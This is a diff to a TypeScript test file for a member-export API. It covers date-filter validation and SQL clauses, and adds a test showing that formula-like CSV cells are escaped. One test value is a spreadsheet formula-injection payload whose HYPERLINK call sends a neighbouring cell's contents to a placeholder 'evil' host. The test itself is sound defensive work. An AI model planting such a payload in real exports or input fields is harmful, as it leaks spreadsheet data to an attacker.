@@ -51,7 +51,7 @@ const exportWith = (qs: string) => getAs(`export?format=json&${qs}`);
 const callFor = (pattern: RegExp) => mockQuery.mock.calls.find(([sql]) => pattern.test(sql)) as [string, unknown[]];
 
 describe('export date filter (Sprint 134 PR A)', () => {
-  it.each(['yesterday', '2026-02-31', '2026-10-01T00:00:00Z', ''])('rejects date_start=%p with 400', async (value) => {
+  it.each(['yesterday', '2026-02-31', '2026-10-01T00:00:00Z', '', '0000-01-01'])('rejects date_start=%p with 400', async (value) => {
     const res = await exportWith(`date_start=${encodeURIComponent(value)}`);
     expect(res.status).toBe(400);
     expect(res.body).toMatchObject({ success: false, message: 'date_start and date_end must be dates (YYYY-MM-DD)', error: 'INVALID_DATE_RANGE' });
@@ -68,7 +68,7 @@ describe('export date filter (Sprint 134 PR A)', () => {
     expect(res.status).toBe(200);
     const [sql, params] = callFor(/FROM communities\.members m\s+JOIN auth\.users/);
     expect(params).toEqual([COMMUNITY, '2026-10-01', '2026-10-31']);
-    expect(sql).toContain("AND (m.joined_at >= COALESCE($2::date, '-infinity') AND m.joined_at < COALESCE($3::date + 1, 'infinity'))");
+    expect(sql).toContain('AND (($2::date IS NULL OR m.joined_at >= $2::date) AND ($3::date IS NULL OR m.joined_at < $3::date + 1))');
   });
 
   it('binds a missing bound as NULL, so each bound keeps its own parameter', async () => {
@@ -84,6 +84,22 @@ describe('export date filter (Sprint 134 PR A)', () => {
     const [sql, params] = callFor(/COUNT\(DISTINCT k\.user_id\)/);
     expect(params).toEqual([COMMUNITY]);
     expect(sql).not.toMatch(/k\.created_at|\$2/);
+  });
+});
+
+describe('export CSV cells cannot run as spreadsheet formulas (Sprint 134 PR A)', () => {
+  it('prefixes member-controlled text that starts with = + - @ tab or CR with a quote, and leaves the rest alone', async () => {
+    const names = ['=HYPERLINK("http://evil/?"&A2,"x")', '+1', '-2', '@SUM(A1)', '\tTab', '\rCR', 'Ann'];
+    mockQuery.mockImplementation((sql: string) => Promise.resolve({
+      rows: /SELECT role/.test(sql) ? [{ role: 'admin' }]
+        : names.map(name => ({ Name: name, Email: 'e@example.com', Role: 'member', Status: 'active', 'Joined Date': '2026-10-01' })),
+    }));
+    const res = await getAs('export/members');
+    expect(res.status).toBe(200);
+    const cells = res.text.split('\n').slice(1).map(line => line.split(',')[0]);
+    expect(cells).toEqual([
+      `"'=HYPERLINK(""http://evil/?""&A2`, "'+1", "'-2", "'@SUM(A1)", "'\tTab", `"'\rCR"`, 'Ann',
+    ]);
   });
 });
 
